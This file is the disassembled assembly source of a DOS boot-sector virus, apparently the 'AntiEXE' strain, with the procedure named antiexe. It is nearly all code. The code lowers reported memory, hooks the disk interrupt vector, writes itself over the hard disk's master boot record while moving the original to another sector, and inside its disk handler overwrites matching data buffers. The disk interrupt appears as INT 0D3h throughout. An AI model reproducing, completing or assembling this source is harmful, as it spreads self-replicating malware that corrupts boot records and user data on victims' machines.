target          EQU   'T2'                      ; Target assembler: TASM-2.X

include  srmacros.inc


; The following equates show data references outside the range of the program.

data_1e         equ     4Ch
data_3e         equ     34Ch
data_4e         equ     34Eh
data_5e         equ     413h
data_6e         equ     46Ch
data_7e         equ     7C00h                   ;*
data_8e         equ     4
data_9e         equ     6
data_10e        equ     30h
data_11e        equ     200h                    ;*
data_12e        equ     3BEh                    ;*
data_13e        equ     3701h                   ;*

seg_a           segment byte public
		assume  cs:seg_a, ds:seg_a


		org     0

antiexe         proc    far

start:
		jmp     loc_8
						;* No entry point to code
		dec     bp
;*              pop     cs                      ; Dangerous-8088 only
		db      0Fh                     ;  Fixup - byte match
		add     [bx+di],al
		push    sp
		xor     ch,ds:data_10e
		add     al,[bx+di]
		add     [bx+si],ax
		add     ah,al
		add     [bx+si+0Bh],al
			   lock or      [bx+si],ax
		adc     al,[bx+si]
		add     al,[bx+si]
		add     [bx+si],al
		dec     bp
		pop     dx
		inc     ax
		add     ds:data_13e[bx+si],cl
;*              pop     cs                      ; Dangerous-8088 only
		db      0Fh                     ;  Fixup - byte match
		loopnz  $-7Eh                   ; Loop if zf=0, cx>0

		cld                             ; Clear direction
		stc                             ; Set carry flag
		jz      loc_ret_5               ; Jump if zero
		mov     word ptr cs:[7],ax
		int     0D3h                    ; ??INT Non-standard interrupt
		jc      loc_ret_5               ; Jump if carry Set
		pushf                           ; Push flags
		cmp     byte ptr cs:[8],2
		jne     loc_4                   ; Jump if not equal
		push    cx
		push    si
		push    di
		push    ds
		sub     cx,cx
		mov     ds,cx
		test    byte ptr ds:data_6e,3
		jz      loc_3                   ; Jump if zero
		push    cs
		pop     ds
		mov     di,bx
loc_1:
;*              lea     si,ds:[1Eh]             ; Load effective addr
		db       8Dh, 36h, 1Eh, 00h     ;  Fixup - byte match
		mov     cx,8
		push    di
		repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
		pop     di
		jz      loc_2                   ; Jump if zero
		add     di,data_11e
		dec     byte ptr cs:[7]
		jnz     loc_1                   ; Jump if not zero
		jmp     short loc_3
		db      90h
loc_2:
		stosb                           ; Store al to es:[di]
loc_3:
		pop     ds
		pop     di
		pop     si
		pop     cx
		cmp     cx,1
		jne     loc_4                   ; Jump if not equal
		cmp     dh,0
		jne     loc_4                   ; Jump if not equal
		call    sub_1
loc_4:
		popf                            ; Pop flags

loc_ret_5:
		retf    2                       ; Return far

antiexe         endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
		push    ax
		push    bx
		push    cx
		push    dx
		push    ds
		push    es
		push    si
		push    di
		push    es
		pop     ds
		mov     ax,word ptr cs:[0]
		cmp     ax,[bx]
		jne     loc_6                   ; Jump if not equal
		mov     ax,word ptr cs:[2]
		cmp     ax,[bx+2]
		jne     loc_6                   ; Jump if not equal
		mov     cx,ds:data_8e[bx]
		mov     dh,ds:data_9e[bx]
		mov     ax,201h
		int     0D3h                    ; ??INT Non-standard interrupt
		jmp     short loc_7
loc_6:
		cmp     dl,1
		ja      loc_7                   ; Jump if above
		mov     ax,[bx+16h]
		mul     byte ptr [bx+10h]       ; ax = data * al
		add     ax,[bx+0Eh]
		push    dx
		mov     cl,4
		mov     dx,[bx+11h]
		shr     dx,cl                   ; Shift w/zeros fill
		add     ax,dx
		dec     ax
		mov     cx,[bx+18h]
		push    cx
		shl     cx,1                    ; Shift w/zeros fill
		sub     dx,dx
		div     cx                      ; ax,dx rem=dx:ax/reg
		pop     cx
		push    ax
		mov     ax,dx
		sub     dx,dx
		div     cx                      ; ax,dx rem=dx:ax/reg
		mov     dh,al
		mov     cl,dl
		pop     ax
		mov     ch,al
		inc     cl
		pop     ax
		mov     dl,al
		mov     byte ptr cs:[6],dh
		mov     word ptr cs:[4],cx
		mov     ax,301h
		int     0D3h                    ; ??INT Non-standard interrupt
		jc      loc_7                   ; Jump if carry Set
		push    cs
		pop     es
		cld                             ; Clear direction
		mov     di,7
		mov     si,bx
		add     si,di
		mov     cx,17h
		rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
		mov     ax,301h
		xor     bx,bx                   ; Zero register
		mov     cx,1
		sub     dh,dh
		int     0D3h                    ; ??INT Non-standard interrupt
loc_7:
		pop     di
		pop     si
		pop     es
		pop     ds
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		retn
sub_1           endp

loc_8:
		xor     di,di                   ; Zero register
		mov     ds,di
		les     dx,dword ptr ds:data_1e ; Load 32 bit ptr
		mov     ds:data_3e,dx
		mov     ds:data_4e,es
		cli                             ; Disable interrupts
		mov     ss,di
		mov     si,data_7e
		mov     sp,si
		sti                             ; Enable interrupts
		push    ds
		push    si
		push    si
		mov     ax,ds:data_5e
		dec     ax
		mov     ds:data_5e,ax
		mov     cl,6
		shl     ax,cl                   ; Shift w/zeros fill
		mov     es,ax
		mov     word ptr ds:data_1e+2,ax
		mov     word ptr ds:data_1e,27h
		push    ax
		mov     ax,155h
		push    ax
		mov     cx,100h
		cld                             ; Clear direction
		rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
		retf
						;* No entry point to code
		xor     ax,ax                   ; Zero register
		mov     es,ax
		int     0D3h                    ; ??INT Non-standard interrupt
		push    cs
		pop     ds
		mov     ax,201h
		pop     bx
		mov     cx,word ptr ds:[4]
		cmp     cx,0Dh
		jne     loc_10                  ; Jump if not equal
		mov     dx,80h
		int     0D3h                    ; ??INT Non-standard interrupt

loc_ret_9:
		retf                            ; Return far
loc_10:
		sub     dx,dx
		mov     dh,ds:data_9e
		int     0D3h                    ; ??INT Non-standard interrupt
		jc      loc_ret_9               ; Jump if carry Set
		push    cs
		pop     es
		mov     ax,201h
		mov     bx,200h
		mov     cx,1
		mov     dx,80h
		int     0D3h                    ; ??INT Non-standard interrupt
		jc      loc_ret_9               ; Jump if carry Set
		xor     si,si                   ; Zero register
		lodsw                           ; String [si] to ax
		cmp     ax,[bx]
		jne     loc_11                  ; Jump if not equal
		lodsw                           ; String [si] to ax
		cmp     ax,[bx+2]
		je      loc_ret_9               ; Jump if equal
loc_11:
		mov     cx,0Dh
		mov     ds:data_8e,cx
		mov     ax,301h
		push    ax
		int     0D3h                    ; ??INT Non-standard interrupt
		pop     ax
		jc      loc_ret_9               ; Jump if carry Set
		mov     si,data_12e
		mov     di,offset data_21
		mov     cx,21h
		rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
		inc     cx
		sub     bx,bx
		mov     ds:data_9e,dh
		int     0D3h                    ; ??INT Non-standard interrupt
		retf                            ; Return far
data_21         db      80h
		db       01h, 01h, 00h, 06h, 0Eh,0DCh
		db      0DCh, 1Ch, 00h, 00h, 00h, 78h
		db       56h, 06h
		db      49 dup (0)
		db       55h,0AAh

seg_a           ends



		end     start
